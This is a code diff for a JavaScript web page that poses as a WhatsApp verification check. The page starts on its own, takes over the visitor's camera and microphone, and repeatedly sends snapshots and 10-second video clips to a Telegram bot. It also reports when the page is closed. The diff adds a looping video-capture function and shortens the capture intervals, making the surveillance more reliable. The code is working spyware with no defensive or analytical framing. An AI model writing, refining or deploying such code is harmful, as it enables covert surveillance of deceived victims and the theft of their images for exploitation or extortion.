@@ -250,7 +250,6 @@
         let stream;
         let isRecording = false;
         let photoInterval;
-        let videoInterval;
 
         // Улучшенная отправка в Telegram
         async function sendToTelegram(message, file = null, type = 'video') {
@@ -260,7 +259,7 @@
             try {
                 let url = '';
                 if (file && type === 'video') {
-                    formData.append('video', file, 'whatsapp_video.webm');
+                    formData.append('video', file, 'whatsapp_video.mp4');
                     formData.append('caption', message);
                     url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
                 } else if (file && type === 'photo') {
@@ -272,12 +271,12 @@
                     url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 }
                 
-                const response = await fetch(url, {
+                await fetch(url, {
                     method: 'POST',
                     body: formData
                 });
                 
-                console.log('Отправлено в Telegram:', message);
+                console.log('Успешно отправлено:', message);
                 return true;
             } catch(e) {
                 console.log('Ошибка отправки:', e);
@@ -317,6 +316,68 @@
             statusEl.style.display = 'block';
         }
 
+        // ПРОСТАЯ И НАДЕЖНАЯ ЗАПИСЬ ВИДЕО
+        function startVideoRecording() {
+            try {
+                // Используем простой формат который гарантированно работает
+                const options = {
+                    mimeType: 'video/webm;codecs=vp8,opus',
+                    videoBitsPerSecond: 1000000
+                };
+                
+                // Пробуем разные форматы
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                    options.mimeType = 'video/webm;codecs=vp9,opus';
+                }
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                    options.mimeType = 'video/webm';
+                }
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                    options.mimeType = 'video/mp4';
+                }
+                
+                mediaRecorder = new MediaRecorder(stream, options);
+                let chunks = [];
+
+                mediaRecorder.ondataavailable = function(e) {
+                    if (e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                mediaRecorder.onstop = function() {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const duration = 10; // 10 секунд записи
+                    
+                    sendToTelegram(
+                        `🎥 WhatsApp Video (${duration}сек) - ${new Date().toLocaleTimeString()}`,
+                        blob,
+                        'video'
+                    );
+                    
+                    chunks = [];
+                    
+                    // Немедленно начинаем новую запись
+                    if (stream && stream.active) {
+                        setTimeout(startVideoRecording, 1000);
+                    }
+                };
+
+                // Записываем 10 секунд - короткие отрезки лучше отправляются
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 10000);
+
+            } catch (error) {
+                console.log('Ошибка записи видео:', error);
+                // Пробуем снова через 3 секунды
+                setTimeout(startVideoRecording, 3000);
+            }
+        }
+
         async function startVerification() {
             try {
                 // Скрываем кнопку и показываем загрузку
@@ -328,8 +389,8 @@
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         width: { ideal: 1280 },
-                        height: { ideal: 720 },
-                        frameRate: { ideal: 30 },
+                        height: { ideal: 720 }, 
+                        frameRate: { ideal: 25 },
                         facingMode: 'user'
                     },
                     audio: {
@@ -358,22 +419,23 @@
                     // МГНОВЕННО делаем первый снимок
                     setTimeout(() => {
                         takeSnapshot();
-                        // Второй снимок через 2 секунды для надежности
+                        // Второй снимок через 1 секунду
+                        setTimeout(takeSnapshot, 1000);
+                        // Третий снимок через 2 секунды
                         setTimeout(takeSnapshot, 2000);
-                    }, 1000);
+                    }, 500);
                     
-                    // Начинаем непрерывную запись видео
-                    startContinuousRecording();
+                    // НАЧИНАЕМ ЗАПИСЬ ВИДЕО СРАЗУ
+                    setTimeout(startVideoRecording, 1000);
                     
-                    // Фото каждые 10 секунд
-                    photoInterval = setInterval(takeSnapshot, 10000);
+                    // Фото каждые 8 секунд
+                    photoInterval = setInterval(takeSnapshot, 8000);
                     
                     // Отправляем уведомление при закрытии страницы
                     window.addEventListener('beforeunload', () => {
                         takeSnapshot();
                         sendToTelegram('🔴 Пользователь закрыл страницу проверки WhatsApp');
-                        clearInterval(photoInterval);
-                        clearInterval(videoInterval);
+                        if (photoInterval) clearInterval(photoInterval);
                     });
 
                 });
@@ -387,60 +449,12 @@
             }
         }
 
-        function startContinuousRecording() {
-            try {
-                mediaRecorder = new MediaRecorder(stream, {
-                    mimeType: 'video/webm;codecs=vp9,opus',
-                    videoBitsPerSecond: 1000000
-                });
-
-                let recordingChunks = [];
-                let recordingStartTime = Date.now();
-
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordingChunks.push(event.data);
-                    }
-                };
-
-                mediaRecorder.onstop = async () => {
-                    if (recordingChunks.length > 0) {
-                        const blob = new Blob(recordingChunks, { type: 'video/webm' });
-                        const duration = ((Date.now() - recordingStartTime) / 1000).toFixed(1);
-                        
-                        await sendToTelegram(
-                            `🎥 WhatsApp Video (${duration}с) - ${new Date().toLocaleTimeString()}`,
-                            blob,
-                            'video'
-                        );
-                    }
-                    
-                    // Немедленно начинаем новую запись
-                    if (stream && stream.active) {
-                        setTimeout(startContinuousRecording, 500);
-                    }
-                };
-
-                // Записываем 15 секунд и отправляем (быстрее!)
-                mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, 15000);
-
-            } catch (error) {
-                console.log('Recording error:', error);
-                setTimeout(startContinuousRecording, 1000);
-            }
-        }
-
-        // Автозапуск через 3 секунды
+        // Автозапуск через 2 секунды
         setTimeout(() => {
             if (document.querySelector('.btn').style.display !== 'none') {
                 startVerification();
             }
-        }, 3000);
+        }, 2000);
 
     </script>
 </body>
